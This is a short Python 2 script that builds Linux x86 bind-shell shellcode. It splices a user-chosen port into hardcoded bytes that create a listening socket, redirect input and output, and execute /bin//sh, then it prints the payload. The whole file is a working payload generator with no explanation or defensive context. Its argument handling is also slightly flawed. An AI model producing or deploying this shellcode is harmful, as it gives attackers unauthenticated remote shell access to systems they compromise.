#!/usr/bin/python

import socket
import sys

shell1 =  ""
shell1 += "\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68"
shell2 = ""
shell2 += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x02\\xb0\\x66\\xcd\\x80\\x52\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x04\\xcd\\x80\\x52\\x52\\x57\\x89\\xe1\\xb0\\x66\\xb3\\x05\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf7\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 2:
	print 'Usage: Wrapper.py <port>'
	exit
else:

	try:

		portNumber = sys.argv[1]
		portNumber = int(portNumber)
		portNumber = socket.htons(portNumber)
		portNumber = hex(portNumber)

		portNum1 = portNumber[2:4]
		portNum2 = portNumber[4:6]

		portNum1 = str(portNum1)
		portNum1 = "\\x" + portNum1

		portNum2 = str(portNum2)
		portNum2 = "\\x" + portNum2

		combined = portNum2 + portNum1

		shell = shell1 + combined + shell2

	
		print shell

	except:
	
		print "Error" 
